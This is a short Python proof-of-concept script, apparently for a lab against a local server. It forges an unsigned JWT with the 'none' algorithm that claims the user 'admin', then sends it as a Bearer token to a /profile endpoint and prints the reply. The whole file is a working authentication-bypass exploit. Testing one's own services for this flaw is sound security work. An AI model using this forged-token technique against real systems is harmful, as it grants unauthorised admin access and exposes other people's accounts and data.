import base64
import json
import requests

def base64url_encode(data: bytes) -> str:
    """Encode bytes into URL-safe Base64 format without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Create the JWT header and payload
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin"}

# Encode header and payload separately
header_enc = base64url_encode(json.dumps(header).encode('utf-8'))
payload_enc = base64url_encode(json.dumps(payload).encode('utf-8'))

# For "none" algorithm, the signature is empty.
forged_token = f"{header_enc}.{payload_enc}."

print("Forged JWT token (alg: none):")
print(forged_token)

# Use the forged token in the Authorization header
url = "http://localhost:5000/profile"
headers = {
    "Authorization": f"Bearer {forged_token}"
}

response = requests.get(url, headers=headers)

print("\nResponse from /profile using the forged token:")
print(response.text)
